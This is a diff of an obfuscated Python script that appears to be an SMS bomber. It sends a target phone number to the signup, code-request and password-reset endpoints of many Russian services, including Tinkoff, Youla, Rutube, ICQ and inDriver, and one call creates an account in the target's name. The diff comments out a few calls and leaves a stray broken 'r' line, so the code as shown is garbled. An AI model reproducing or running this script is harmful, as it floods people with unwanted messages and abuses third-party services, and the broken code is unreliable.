@@ -94,7 +94,7 @@ def Main ():#line:15
 											requests .post ('https://api.tinkoff.ru/v1/sign_up',data ={'phone':'+'+_O000O000O0OOO00O0 })#line:97
 											requests .post ('https://api.mtstv.ru/v1/users',json ={'msisdn':_O000O000O0OOO00O0 })#line:98
 											requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':_O000O000O0OOO00O0 })#line:99
-											requests .post ('https://pizzahut.ru/account/password-reset',data ={'reset_by':'phone','action_id':'pass-recovery','phone':_OOO000000O0O0OO00 ,'_token':'*'})#line:100
+											#requests .post ('https://pizzahut.ru/account/password-reset',data ={'reset_by':'phone','action_id':'pass-recovery','phone':_OOO000000O0O0OO00 ,'_token':'*'})#line:100
 											requests .post ('https://www.rabota.ru/remind',data ={'credential':_O000O000O0OOO00O0 })#line:101
 											requests .post ('https://rutube.ru/api/accounts/sendpass/phone',data ={'phone':'+'+_O000O000O0OOO00O0 })#line:102
 											requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_O000O000O0OOO00O0 +'/')#line:103
@@ -129,8 +129,8 @@ def Main ():#line:15
 											requests .post ("https://api.carsmile.com/",json ={"operationName":"enterPhone","variables":{"phone":_O000O000O0OOO00O0 },"query":"mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})#line:132
 											requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_O000O000O0OOO00O0 +'/')#line:133
 											requests .post ("https://api.delitime.ru/api/v2/signup",data ={"SignupForm[username]":_O000O000O0OOO00O0 ,"SignupForm[device_type]":3 })#line:134
-											requests .get ('https://findclone.ru/register',params ={'phone':'+'+_O000O000O0OOO00O0 })#line:135
-											requests .post ("https://guru.taxi/api/v1/driver/session/verify",json ={"phone":{"code":1 ,"number":_O000O000O0OOO00O0 }})#line:136
+											r
+											#requests .post ("https://guru.taxi/api/v1/driver/session/verify",json ={"phone":{"code":1 ,"number":_O000O000O0OOO00O0 }})#line:136
 											requests .post ('https://www.icq.com/smsreg/requestPhoneValidation.php',data ={'msisdn':_O000O000O0OOO00O0 ,"locale":'en','countryCode':'ru','version':'1',"k":"ic1rtwz1s1Hj1O0r","r":"46763"})#line:137
 											requests .post ("https://terra-1.indriverapp.com/api/authorization?locale=ru",data ={"mode":"request","phone":"+"+_O000O000O0OOO00O0 ,"phone_permission":"unknown","stream_id":0 ,"v":3 ,"appversion":"3.20.6","osversion":"unknown","devicemodel":"unknown"})#line:138
 											requests .post ("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data ={"password":OO0OO00O0OO0O0O00 ,"application":"lkp","login":"+"+_O000O000O0OOO00O0 })#line:139
